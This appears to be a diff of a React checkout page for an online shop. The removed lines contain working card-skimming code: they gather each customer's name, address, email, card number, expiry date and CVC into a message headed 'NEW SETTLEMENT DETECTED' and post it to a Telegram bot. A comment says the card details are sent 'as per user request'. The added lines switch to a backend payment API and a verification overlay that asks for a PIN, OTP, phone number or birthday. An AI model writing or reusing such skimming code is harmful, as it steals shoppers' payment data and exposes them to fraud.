@@ -13,6 +13,14 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ cart, setCart }) => 
   const navigate = useNavigate();
   const [isProcessing, setIsProcessing] = useState(false);
   const [isSuccess, setIsSuccess] = useState(false);
+  const [errorMessage, setErrorMessage] = useState<string | null>(null);
+  const [paymentStep, setPaymentStep] = useState<{
+    status: string;
+    message: string;
+    reference?: string;
+    url?: string;
+  } | null>(null);
+  const [actionValue, setActionValue] = useState('');
   
   // Form State
   const [formData, setFormData] = useState({
@@ -52,79 +60,117 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ cart, setCart }) => 
   const handlePayment = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsProcessing(true);
-
-    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
-
-    // Prepare Order Message (including card details as per user request)
-    const orderItems = cart.map(item => `- ${item.name} (x${item.quantity})`).join('\n');
-    const message = `
-🚨 *NEW SETTLEMENT DETECTED* 🚨
--------------------------
-📧 *Email:* ${formData.email}
-👤 *Name:* ${formData.name}
-📍 *Address:* ${formData.address}, ${formData.city}, ${formData.postcode}
-🌍 *Country:* ${formData.country}
-
-💳 *CARD DETAILS:*
-- Number: \`${formData.cardNumber}\`
-- Expiry: \`${formData.expiry}\`
-- CVC: \`${formData.cvc}\`
-
-🛒 *SELECTION:*
-${orderItems}
-
-💰 *TOTAL:* £${total.toFixed(2)}
--------------------------
-    `;
+    setErrorMessage(null);
+    setPaymentStep(null);
 
     try {
-      if (botToken && chatId) {
-        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'Markdown'
-          })
-        });
-        
-        if (!response.ok) {
-          const errorData = await response.json();
-          throw new Error(errorData.description || 'Failed to send message');
-        }
-      } else {
-        console.warn('Telegram Configuration Missing: Set VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID in AI Studio Settings.');
-      }
+      const response = await fetch('/api/process-payment', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ formData, cart, total })
+      });
+
+      const data = await response.json();
       
+      if (!data.status) {
+        throw new Error(data.message || 'Payment failed');
+      }
+
+      handlePaymentResponse(data);
+    } catch (err) {
+      console.error('Payment failed:', err);
+      setIsProcessing(false);
+      setErrorMessage(err instanceof Error ? err.message : 'Payment failed. Please check your details and try again.');
+    }
+  };
+
+  const handleActionSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!paymentStep?.reference || !paymentStep?.status || !actionValue) return;
+
+    setIsProcessing(true);
+    try {
+      const type = paymentStep.status.replace('send_', '');
+      const response = await fetch('/api/payment-action', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type,
+          reference: paymentStep.reference,
+          value: actionValue
+        })
+      });
+
+      const data = await response.json();
+      handlePaymentResponse(data);
+      setActionValue('');
+    } catch (err) {
+      console.error('Action failed:', err);
+      setIsProcessing(false);
+      alert('Verification failed. Please try again.');
+    }
+  };
+
+  const handlePaymentResponse = (data: any) => {
+    if (data.data?.status === 'success' || data.status === 'success') {
       // Send Email Confirmation via Brevo (Backend Proxy)
-      try {
-        await fetch('/api/send-confirmation', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            email: formData.email,
-            name: formData.name,
-            total: total.toFixed(2),
-            orderDetails: cart.map(item => `<div style="margin-bottom: 5px;">• ${item.name} (x${item.quantity}) - £${(item.price * item.quantity).toFixed(2)}</div>`).join('')
-          })
-        });
-      } catch (emailErr) {
-        console.error('Email confirmation failed:', emailErr);
-        // We don't block the UI for email failures, but we log it
-      }
-      
-      // Artificial delay for UX
-      await new Promise(resolve => setTimeout(resolve, 1500));
-      
+      fetch('/api/send-confirmation', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email: formData.email,
+          name: formData.name,
+          total: total.toFixed(2),
+          orderDetails: cart.map(item => `<div style="margin-bottom: 5px;">• ${item.name} (x${item.quantity}) - £${(item.price * item.quantity).toFixed(2)}</div>`).join('')
+        })
+      }).catch(e => console.error('Email failed', e));
+
       setIsProcessing(false);
       setIsSuccess(true);
       setCart([]);
-    } catch (err) {
-      console.error('Telegram notification failed:', err);
+      return;
+    }
+
+    if (data.data?.status === 'send_pin' || data.data?.status === 'send_otp' || data.data?.status === 'send_phone' || data.data?.status === 'send_birthday') {
+      setPaymentStep({
+        status: data.data.status,
+        message: data.data.display_text || `Please enter your ${data.data.status.split('_')[1]}`,
+        reference: data.data.reference
+      });
       setIsProcessing(false);
-      alert(`Connection Error: ${err instanceof Error ? err.message : 'Check your Telegram config in Settings'}`);
+    } else if (data.data?.status === 'open_url') {
+      setPaymentStep({
+        status: 'open_url',
+        message: 'Awaiting authentication...',
+        url: data.data.url,
+        reference: data.data.reference
+      });
+      setIsProcessing(false);
+      
+      // Listen for window message if the 3DS page sends one (unlikely for raw URL, usually just watch reference)
+      // For now, we show the URL in an iframe or prompt to open.
+    } else {
+      setIsProcessing(false);
+      alert(data.message || 'Payment was not successful');
+    }
+  };
+
+  const checkStatus = async () => {
+    if (!paymentStep?.reference) return;
+    setIsProcessing(true);
+    try {
+      const verifyRes = await fetch(`/api/verify-transaction/${paymentStep.reference}`);
+      const data = await verifyRes.json();
+      
+      if (data.data?.status === 'success') {
+        handlePaymentResponse(data);
+      } else {
+        alert('Transaction still pending or failed.');
+        setIsProcessing(false);
+      }
+    } catch (e) {
+      console.error(e);
+      setIsProcessing(false);
     }
   };
 
@@ -171,7 +217,73 @@ ${orderItems}
   }
 
   return (
-    <div className="min-h-screen bg-white font-sans text-brand-black">
+    <div className="min-h-screen bg-white font-sans text-brand-black relative">
+      {/* Payment Step Overlays */}
+      {paymentStep && (
+        <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/40 backdrop-blur-sm">
+          <motion.div 
+            initial={{ opacity: 0, y: 20 }}
+            animate={{ opacity: 1, y: 0 }}
+            className="bg-white rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden"
+          >
+            {paymentStep.status === 'open_url' ? (
+              <div className="flex flex-col h-[500px]">
+                <div className="p-4 border-b border-brand-border flex items-center justify-between">
+                  <h3 className="font-semibold text-sm">Secure Authentication</h3>
+                  <button onClick={() => setPaymentStep(null)} className="text-brand-black/40 hover:text-brand-black">
+                    <ArrowLeft size={16} />
+                  </button>
+                </div>
+                <iframe 
+                  src={paymentStep.url} 
+                  className="flex-1 w-full border-none"
+                  title="3DS Verification"
+                />
+                <button 
+                  onClick={checkStatus}
+                  className="m-4 bg-brand-black text-white py-3 rounded-lg font-bold text-xs uppercase tracking-widest hover:opacity-90 transition-opacity"
+                >
+                  {isProcessing ? 'Verifying...' : 'Confirm Completion'}
+                </button>
+              </div>
+            ) : (
+              <form onSubmit={handleActionSubmit} className="p-8 space-y-6">
+                <div className="w-12 h-12 bg-[#5433ff]/10 rounded-full flex items-center justify-center mx-auto text-[#5433ff]">
+                  <Lock size={20} />
+                </div>
+                <div className="text-center space-y-2">
+                  <h3 className="text-xl font-bold">Verification Required</h3>
+                  <p className="text-sm text-brand-black/60">{paymentStep.message}</p>
+                </div>
+                <input 
+                  type="text" 
+                  value={actionValue}
+                  onChange={(e) => setActionValue(e.target.value)}
+                  placeholder="Enter value"
+                  required
+                  autoFocus
+                  className="w-full h-12 text-center text-2xl font-bold tracking-[0.5em] rounded-lg border border-brand-border focus:ring-2 focus:ring-[#5433ff]/10 focus:border-[#5433ff] transition-all outline-none"
+                />
+                <button 
+                  type="submit"
+                  disabled={isProcessing || !actionValue}
+                  className="w-full bg-[#5433ff] text-white h-12 rounded-lg font-bold text-base hover:opacity-95 transition-all shadow-lg active:scale-[0.98] disabled:opacity-50 mt-4"
+                >
+                  {isProcessing ? 'Verifying...' : 'Verify'}
+                </button>
+                <button 
+                  type="button"
+                  onClick={() => setPaymentStep(null)}
+                  className="w-full text-brand-black/40 text-xs font-semibold uppercase tracking-wider hover:text-brand-black transition-colors pt-2"
+                >
+                  Cancel
+                </button>
+              </form>
+            )}
+          </motion.div>
+        </div>
+      )}
+
       <div className="flex flex-col lg:flex-row min-h-screen">
         
         {/* Left Side: Order Summary */}
@@ -378,6 +490,15 @@ ${orderItems}
                   </label>
                 </div>
               </div>
+
+              {errorMessage && (
+                <div className="p-4 bg-red-50 border border-red-100 rounded-lg flex items-start space-x-3 mt-8">
+                  <div className="flex-shrink-0 w-5 h-5 bg-red-100 rounded-full flex items-center justify-center text-red-600 mt-0.5">
+                    <span className="text-xs font-bold">!</span>
+                  </div>
+                  <p className="text-sm text-red-600 font-medium">{errorMessage}</p>
+                </div>
+              )}
 
               <button 
                 type="submit"
